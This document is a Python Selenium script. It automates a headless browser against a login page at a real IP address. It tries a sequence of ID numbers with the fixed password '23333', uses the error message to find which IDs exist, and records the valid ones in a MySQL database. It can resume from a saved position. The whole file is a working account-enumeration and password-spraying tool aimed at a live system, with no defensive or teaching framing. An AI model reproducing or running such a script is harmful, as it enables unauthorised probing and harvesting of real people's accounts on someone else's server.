# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from MySQLCommand_tn import MySQLCommand
chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
chrome_options.add_argument('--disable-gpu')  # 上面三行代码就是为了将Chrome不弹出界面，实现无界面爬取
browser = webdriver.Chrome(options=chrome_options)
browser.get('http://60.219.165.24')
mysqlCommand = MySQLCommand()
mysqlCommand.connectMysql()
i = 0

try:
    lastid = open('/root/lastid.txt', 'r')
    startid = int(lastid.read()[-10:])
    lastid.close()
    for i in range(startid, 2017809999):
        if str(i)[4:6] == '80':
            username = browser.find_element_by_name('zjh')
            username.send_keys(i)
            username = browser.find_element_by_name('mm')
            username.send_keys('23333')
            btn = browser.find_element_by_id('btnSure')
            btn.click()
            message = browser.find_elements_by_xpath(
                '//td[@class="errorTop"]')[0].text
            if message == "你输入的证件号不存在，请您重新输入！":
                print('未通过：' + str(i))
                continue
            else:
                print(i)
                mysqlCommand.insertData(i)
finally:
    newlastid = open('/root/lastid.txt', 'w')
    newlastid.write(str(i))
    newlastid.close()
    browser.close()
    mysqlCommand.closeMysql()
